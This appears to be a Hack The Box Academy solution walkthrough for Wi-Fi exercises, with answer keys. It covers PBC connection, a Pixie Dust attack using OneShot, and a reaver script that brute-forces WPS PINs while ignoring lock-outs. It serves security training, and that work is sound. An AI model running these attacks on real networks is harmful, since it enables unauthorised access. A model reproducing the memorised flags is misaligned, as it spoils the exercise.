# Push Button Configuration

## Question 1

### "Connect to the Wi-Fi network using the PBC method as outlined in the section. Once connected, submit the flag value present at http://192.168.1.1/"

After spawning the target, students will establish an RDP session using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.100]─[htb-ac-8414@htb-xcpridbtoe]─[~]
└──╼ [★]$ xfreerdp /v:10.129.231.149 /u:wifi /p:wifi /dynamic-resolution 

[07:00:44:106] [60836:60837] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[07:00:44:407] [60836:60837] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[07:00:44:407] [60836:60837] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[07:00:45:425] [60836:60837] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[07:00:45:425] [60836:60837] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[07:00:45:425] [60836:60837] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Next, students will open a terminal and switch to the `root` user:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

Subsequently, students will scan the environment using `wpa_cli` to obtain information about available wireless networks and their respective MAC addresses, and if PBC is enabled by scrutinizing `WPS-PBC` in the output:

Code: shell

```shell
wpa_cli scan_results
```

```
root@WiFiIntro:/home/wifi# wpa_cli scan_results

Selected interface 'wlan0'
bssid / frequency / signal level / flags / ssid
d8:d6:3d:eb:29:d5	2412	-49	[WPA2-PSK-CCMP][WPS-PBC][ESS]	HackTheWireless
```

Students will use the MAC address of the found network within `wpa_cli` to connect:

Code: shell

```shell
wpa_cli wps_pbc d8:d6:3d:eb:29:d5
```

```
root@WiFiIntro:/home/wifi# wpa_cli wps_pbc d8:d6:3d:eb:29:d5

Selected interface 'wlan0'
OK
```

After a few seconds, students will verify the successful connection to the network using `systemctl` and the `CTRL-EVENT-CONNECTED` status message within the `wpa_supplicant` service:

Code: shell

```shell
systemctl status wpa_supplicant
```

```
root@WiFiIntro:/home/wifi# systemctl status wpa_supplicant

● wpa_supplicant.service - WPA supplicant
     Loaded: loaded (/lib/systemd/system/wpa_supplicant.service; enabled; vendor preset: enabled)
    Drop-In: /run/systemd/system/service.d
             └─zzz-lxc-service.conf
     Active: active (running) since Mon 2024-11-04 12:57:25 UTC; 5min ago
   Main PID: 208 (wpa_supplicant)
      Tasks: 1 (limit: 4579)
     Memory: 7.0M
     CGroup: /system.slice/wpa_supplicant.service
             └─208 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant

Nov 04 13:02:18 WiFiIntro wpa_supplicant[208]: wlan0: WPS-SUCCESS
Nov 04 13:02:18 WiFiIntro wpa_supplicant[208]: wlan0: CTRL-EVENT-EAP-FAILURE EAP authentication failed
Nov 04 13:02:18 WiFiIntro wpa_supplicant[208]: wlan0: CTRL-EVENT-DISCONNECTED bssid=d8:d6:3d:eb:29:d5 reason=3 locally_generated>
Nov 04 13:02:18 WiFiIntro wpa_supplicant[208]: wlan0: CTRL-EVENT-DSCP-POLICY clear_all
Nov 04 13:02:18 WiFiIntro wpa_supplicant[208]: wlan0: SME: Trying to authenticate with d8:d6:3d:eb:29:d5 (SSID='HackTheWireless'>
Nov 04 13:02:18 WiFiIntro wpa_supplicant[208]: wlan0: Trying to associate with d8:d6:3d:eb:29:d5 (SSID='HackTheWireless' freq=24>
Nov 04 13:02:18 WiFiIntro wpa_supplicant[208]: wlan0: Associated with d8:d6:3d:eb:29:d5
Nov 04 13:02:18 WiFiIntro wpa_supplicant[208]: wlan0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
Nov 04 13:02:18 WiFiIntro wpa_supplicant[208]: wlan0: WPA: Key negotiation completed with d8:d6:3d:eb:29:d5 [PTK=CCMP GTK=CCMP]
Nov 04 13:02:18 WiFiIntro wpa_supplicant[208]: wlan0: CTRL-EVENT-CONNECTED - Connection to d8:d6:3d:eb:29:d5 completed [id=0 id_>
```

Subsequently, students will use `dhclient` to obtain an IP address on the `wlan0` interface:

Code: shell

```shell
dhclient wlan0
```

```
root@WiFiIntro:/home/wifi# dhclient wlan0
```

Students will use `wget` to get `index.html` from `http://192.168.1.1`, which holds the flag:

Code: shell

```shell
wget http://192.168.1.1
cat index.html
```

```
root@WiFiIntro:/home/wifi# wget http://192.168.1.1/

--2024-11-04 13:03:18--  http://192.168.1.1/
Connecting to 192.168.1.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22 [text/html]
Saving to: ‘index.html’

<SNIP>

2024-11-04 13:03:18 (2.97 MB/s) - ‘index.html’ saved [22/22]

root@WiFiIntro:/home/wifi# cat index.html 

{hidden}
```

Answer: `HTB{CONNECT_WITH_PBC}`

# Attacking Wi-Fi Protected Setup - Skills Assessment

## Question 1

### "What is the WPS PIN for the WiFi network named VirtualCorp?"

After spawning the target, students will establish an RDP session using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.100]─[htb-ac-8414@htb-krijl4yf0j]─[~]
└──╼ [★]$ xfreerdp /v:10.129.230.176 /u:wifi /p:wifi /dynamic-resolution 

[07:20:35:922] [10854:10855] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[07:20:36:223] [10854:10855] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[07:20:36:223] [10854:10855] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[07:20:36:240] [10854:10855] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[07:20:36:240] [10854:10855] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[07:20:36:240] [10854:10855] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and switch to the `root` user:

Code: shell

```shell
sudo -s
```

```
wifi@WiFiIntro:~$ sudo -s
```

Next, students will use `airmon-ng` to set the `wlan0` interface in `Monitor` mode:

Code: shell

```shell
airmon-ng start wlan0
```

```
root@WiFiIntro:/home/wifi# airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    184 avahi-daemon
    204 wpa_supplicant
    210 avahi-daemon
    226 NetworkManager

PHY	Interface	Driver		Chipset

phy2	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
		(mac80211 station mode vif disabled for [phy2]wlan0)
```

Students will use `airodump-ng` to scan the environment for available wireless networks and note the MAC address of the `VirtualCorp` network. Note the MAC address changes upon spawn/reset.

Code: shell

```shell
airodump-ng wlan0mon --wps
```

```
root@WiFiIntro:/home/wifi# airodump-ng wlan0mon --wps

 CH 10 ][ Elapsed: 0 s ][ 2024-11-05 06:56 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 4A:5C:B4:68:0A:9F  -28        3        0    0   1   54   WPA2 CCMP   PSK  2.0    VirtualCorp                                                 
 72:40:6E:74:2F:3B  -28        3        0    0   1   54   WPA2 CCMP   PSK  2.0    HackTheBox-Corp
```

Subsequently, students will perform a Pixie Dust Attack using `OneShot` located in `/opt/OneShot` using the MAC address of the `VirtualCorp` wireless network to attain the WPS pin:

Code: shell

```shell
python3 /opt/OneShot/oneshot.py -b 4A:5C:B4:68:0A:9F -i wlan0mon -K
```

```
root@WiFiIntro:/home/wifi# python3 /opt/OneShot/oneshot.py -b 4A:5C:B4:68:0A:9F -i wlan0mon -K

[*] Running wpa_supplicant…
[*] Running wpa_supplicant…
[*] Trying PIN '68184636'…
[*] Scanning…
[*] Authenticating…
[+] Authenticated
[*] Associating with AP…
[+] Associated with 4A:5C:B4:68:0A:9F (ESSID: VirtualCorp)

<SNIP>

[-] Error: PIN was wrong
[*] Running Pixiewps…

 Pixiewps 1.4

 [?] Mode:     1 (RT/MT/CL)
 [*] Seed N1:  0x56690eb0
 [*] Seed ES1: 0x00000000
 [*] Seed ES2: 0x00000000
 [*] PSK1:     9efb939896f54cb4257c9b1061d18f7f
 [*] PSK2:     dbf9e67d42259911303de2fd43d4bd87
 [*] ES1:      00000000000000000000000000000000
 [*] ES2:      00000000000000000000000000000000
 [+] WPS pin:  {hidden}

 [*] Time taken: 0 s 39 ms

<SNIP>
```

Answer: `98990987`

# Attacking Wi-Fi Protected Setup - Skills Assessment

## Question 2

### "What is the WPS PIN for the WiFi network named HackTheBox-Corp?"

Students will reuse the previously established RDP session. They will stop the previously started `wlan0mon` interface using `airmon-ng`:

Code: shell

```shell
airmon-ng stop wlan0mon
```

```
root@WiFiIntro:/home/wifi# airmon-ng stop wlan0mon

PHY	Interface	Driver		Chipset

phy2	wlan0mon	htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 station mode vif enabled on [phy2]wlan0)

		(mac80211 monitor mode vif disabled for [phy2]wlan0mon)
```

Subsequently, students will add a new interface `mon0` with `Monitor` mode enabled:

Code: shell

```shell
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up
```

```
root@WiFiIntro:/home/wifi# iw dev wlan0 interface add mon0 type monitor
root@WiFiIntro:/home/wifi# ifconfig mon0 up
```

Students will use `wpspin` to generate possible predefined WPS pins that are going to be used further with `reaver` targeting the `72:40:6E:74:2F:3B` MAC address found using `airodump-ng` from the previous question:

```shell
wpspin -A 72:40:6E:74:2F:3B | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' '
```
```
root@WiFiIntro:/home/wifi# wpspin -A 72:40:6E:74:2F:3B | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' '

76142673 24952910 31080279 31080279 10149713 42705239 65814352 35934868 20660413 53157652 84636386 91629487 52285349 28428015 51018658 66505471 04217176 12345670 20172527 46264848 76229909 62327145 10864111 31957199 30432031 71412252 68175542 95661469 95719115 48563710 20854836 43977680 05294176 99956042 35611530 67958146 34259283 94229882 95755212
```

Next, students will utilize the bash script from the `Using Multiple Pre-defined PINs`, altering the MAC address and adding the `-L` parameter to ignore locks on the access point:

```shell
cat << EOF > pinguess.sh
#!/bin/bash

PINS='76142673 24952910 31080279 31080279 10149713 42705239 65814352 35934868 20660413 53157652 84636386 91629487 52285349 28428015 51018658 66505471 04217176 12345670 20172527 46264848 76229909 62327145 10864111 31957199 30432031 71412252 68175542 95661469 95719115 48563710 20854836 43977680 05294176 99956042 35611530 67958146 34259283 94229882 95755212'

for PIN in \$PINS
do
   if sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 72:40:6E:74:2F:3B -c 1 -p \$PIN -L > /dev/null 2>&1; then
            echo "[+] WPS PIN Found: \$PIN"
            break
   fi   
done
echo "PIN Guesses Complete"
EOF
```
```
root@WiFiIntro:/home/wifi# cat << EOF > pinguess.sh
#!/bin/bash

PINS='76142673 24952910 31080279 31080279 10149713 42705239 65814352 35934868 20660413 53157652 84636386 91629487 52285349 28428015 51018658 66505471 04217176 12345670 20172527 46264848 76229909 62327145 10864111 31957199 30432031 71412252 68175542 95661469 95719115 48563710 20854836 43977680 05294176 99956042 35611530 67958146 34259283 94229882 95755212'

for PIN in \$PINS
do
   if sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 72:40:6E:74:2F:3B -c 1 -p \$PIN -L > /dev/null 2>&1; then
            echo "[+] WPS PIN Found: \$PIN"
            break
   fi   
done
echo "PIN Guesses Complete"
EOF
```

Subsequently, students will run the bash script and will obtain the WPS pin:

```shell
bash pinguess.sh
```
```
root@WiFiIntro:/home/wifi# bash pinguess.sh 

[+] WPS PIN Found: {hidden}
PIN Guesses Complete
```

Answer: `31080279`